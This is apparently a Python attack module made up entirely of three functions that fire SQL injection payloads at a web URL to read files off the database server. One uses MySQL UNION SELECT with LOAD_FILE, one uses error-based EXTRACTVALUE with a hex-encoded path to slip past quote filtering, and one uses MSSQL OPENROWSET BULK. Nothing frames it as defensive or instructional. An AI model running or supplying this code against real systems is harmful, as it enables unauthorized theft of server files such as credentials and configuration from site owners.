import urllib.request
import urllib.parse
import re

def file_read_mysql(url, param, file_path, col_count=1):
    """Read a server-side file via MySQL LOAD_FILE() through UNION injection.
    Requires FILE privilege on the MySQL user."""
    nulls = ','.join(['NULL'] * (col_count - 1))
    if col_count > 1:
        payload = "' UNION SELECT LOAD_FILE('%s'),%s-- -" % (file_path, nulls)
    else:
        payload = "' UNION SELECT LOAD_FILE('%s')-- -" % file_path
    full_url = url + urllib.parse.quote(payload, safe='')
    try:
        resp = urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        return resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', errors='replace')
    except Exception:
        return None

def file_read_mysql_hex(url, param, file_path):
    """Read file via LOAD_FILE with hex-encoded path to avoid quote filtering."""
    hex_path = '0x' + file_path.encode().hex()
    payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE(%s),0x7e))-- -" % hex_path
    full_url = url + urllib.parse.quote(payload, safe='')
    try:
        resp = urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        body = resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
    except Exception:
        return None
    match = re.search(r'~([^~]+)~', body)
    return match.group(1) if match else None

def file_read_mssql(url, param, file_path):
    """Read file via MSSQL OPENROWSET bulk import."""
    payload = ("' UNION SELECT data FROM OPENROWSET("
               "BULK '%s', SINGLE_CLOB) AS x(data)-- -") % file_path
    full_url = url + urllib.parse.quote(payload, safe='')
    try:
        resp = urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        return resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', errors='replace')
    except Exception:
        return None
